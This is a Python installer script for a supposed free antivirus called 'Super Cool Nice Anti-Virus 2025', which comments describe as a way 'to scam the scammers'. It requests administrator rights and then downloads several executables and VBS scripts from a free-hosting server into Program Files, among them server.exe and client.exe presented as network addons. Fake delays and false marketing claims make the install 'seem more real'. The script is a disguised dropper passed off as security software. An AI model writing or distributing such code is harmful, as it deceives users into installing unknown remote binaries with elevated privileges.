import ctypes, sys, os, urllib.request, time, zipfile
# To scam the scammers
os.system("taskkill /f /im SCNAV.exe")
userpf = os.environ['USERPROFILE']

scnav = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/autorun.exe"
param = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/param.vbs"
vtparam = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/vt.vbs"
scan = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/scan.exe"
remove = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/remove.exe"
audio = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/scanfinish.wav"

scanneddirs = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/scanneddirs.txt"
threatsexe = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/threatsexe.txt"
threats = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/threats.txt"
history = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/scanhistory.txt"
shortcut = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/shortcut.lnk"

bases = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/bases.txt"
basesver = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/basesver.txt"

netconf = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/netconf.txt"
sscan = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/sscan.exe"
sremove = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/sremove.exe"
server = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/server.exe"
client = "http://server1.ilovetech0629.epizy.com:4556/SCNAV/download/client.exe"





def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        print("error on figuring out if the installer is admin!")
        return False

if is_admin():
    os.system("taskkill /f /im SCNAV.exe")
    print("Super Cool Nice Anti-Virus 2025 Edition installer")
    print("""

░██████╗░█████╗░███╗░░██╗░█████╗░██╗░░░██╗  ██╗░░░██╗██████╗░██████╗░░█████╗░████████╗███████╗██████╗░██╗
██╔════╝██╔══██╗████╗░██║██╔══██╗██║░░░██║  ██║░░░██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██║
╚█████╗░██║░░╚═╝██╔██╗██║███████║╚██╗░██╔╝  ██║░░░██║██████╔╝██║░░██║███████║░░░██║░░░█████╗░░██████╔╝██║
░╚═══██╗██║░░██╗██║╚████║██╔══██║░╚████╔╝░  ██║░░░██║██╔═══╝░██║░░██║██╔══██║░░░██║░░░██╔══╝░░██╔══██╗╚═╝
██████╔╝╚█████╔╝██║░╚███║██║░░██║░░╚██╔╝░░  ╚██████╔╝██║░░░░░██████╔╝██║░░██║░░░██║░░░███████╗██║░░██║██╗
╚═════╝░░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝░░░╚═╝░░░  ░╚═════╝░╚═╝░░░░░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝
     Installer version 1.0. If any update is released to the program, Update using this installer!! 
     No need to redownload this updater unless more files are added                                                                           
                                                                                                                                                                    
""")
    print("Copyright (C) Backdoor Interactive 2025")
    print("")
    print("SCNAV Is the best way to protect your new and old computers!")
    print("SCNAV is extremely soft on system resources, it does not run in the background or on startup, and does not send any telemetry what so ever!")
    print("Advanced scanning features like Duplicate detection and regestry string scanner. you can ensure your computer is safe sound from all threat")
    print("This software is entirely Free. including no annoyances what so ever! Scan your PC for viruses and malware by checking hashes. SCNAV currently has tons malware hashes in the bases!")
    print("Will install to C:\Program Files\SCNAV2025")
    print("checking if already installed please wait...")
    # Delay seems nice here. Makes it seem more real
    time.sleep(5)
    maindir = 'C:\\Program Files\\SCNAV2025'
    maindirqu = '"C:\\Program Files\\SCNAV2025"' # kinda pointless to have this in a var. but here if needed for future features
    os.system(f'mkdir {maindirqu}') 

    print("Downloading SCNAV.exe")
    urllib.request.urlretrieve(scnav, os.path.join(maindir, "SCNAV.exe"))
    print("Downloading scan.exe")
    urllib.request.urlretrieve(scan, os.path.join(maindir, 'scan.exe'))
    print("Downloading remove.exe")
    urllib.request.urlretrieve(remove, os.path.join(maindir, 'remove.exe'))
    print("Downloading param.vbs")
    urllib.request.urlretrieve(param, os.path.join(maindir, 'param.vbs'))
    print("Downloading virustotal.vbs")
    urllib.request.urlretrieve(vtparam, os.path.join(maindir, 'vt.vbs'))
    print("Downloading sound effects!")
    urllib.request.urlretrieve(audio, os.path.join(maindir, 'scnfinish.wav'))
    print("Downloading scanneddirs.txt")
    urllib.request.urlretrieve(scanneddirs, os.path.join(maindir, 'scanneddirs.txt'))
    print("Downloading threats.txt") 
    urllib.request.urlretrieve(threats, os.path.join(maindir, 'threats.txt'))
    print("Downloading threatsexe.txt") 
    urllib.request.urlretrieve(threatsexe, os.path.join(maindir, 'threatsexe.txt'))
    print("Downloading scanhistory.txt")
    urllib.request.urlretrieve(history, os.path.join(maindir, 'scanhistory.txt'))
    print("Downloading Addon: SCNAV Network Antivirus Server v1.0")
    print("Downloading netconf.txt")
    urllib.request.urlretrieve(netconf, os.path.join(maindir, 'netconf.txt'))
    print("Downloading sscan.exe")
    urllib.request.urlretrieve(sscan, os.path.join(maindir, 'sscan.exe'))
    print("Downloading sremove.exe")
    urllib.request.urlretrieve(sremove, os.path.join(maindir, 'sremove.exe'))
    print("Downloading SCNAV network server addon feature (server.exe)")
    urllib.request.urlretrieve(server, os.path.join(maindir, 'server.exe'))
    print("Downloading SCNAV network client addon feature (client.exe)")
    urllib.request.urlretrieve(client, os.path.join(maindir, 'client.exe'))
    print("Setting up addons!")
    time.sleep(2)
    print("Addon: Network features installed successfully")
    print("Info from addon:\n To use SCNAV's network features first press the Server button on the GUI, that will tell you what to do")
    time.sleep(3)
    print("Downloading Super Cool Nice Antivirus 2025.lnk (Shortcut file)")
    urllib.request.urlretrieve(shortcut, os.path.join(maindir, 'Super Cool Nice Antivirus 2025.lnk'))
    print("Downloading the malware database! Please wait as this could take some time! (File size is ~1gb)")
    urllib.request.urlretrieve(bases, os.path.join(maindir, 'bases.txt'))
    print("Download complete. Verifying bases integrity")
    time.sleep(5)
    urllib.request.urlretrieve(basesver, os.path.join(maindir, 'basever.txt'))
    with open(os.path.join(maindir, 'basever.txt'), 'r') as file:
        line = file.readline()
        print(line)
    time.sleep(2)
    print("")
    print("Bases are installed / updated sucessfully")
    time.sleep(4)
    os.chdir(maindir) 
    print("Copying shortcut to desktop")
    os.system(f'copy "Super Cool Nice Antivirus 2025.lnk" "{userpf}\\Desktop"')
    print("Installation Complete!")
    print("Thank you for installing Super Cool Nice Antivirus 2025")
    time.sleep(4)
else:
    # Didnt run as admin, Ask for admin and rerun
    print("SCNAV Installer needs admin to run")
    time.sleep(3)
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
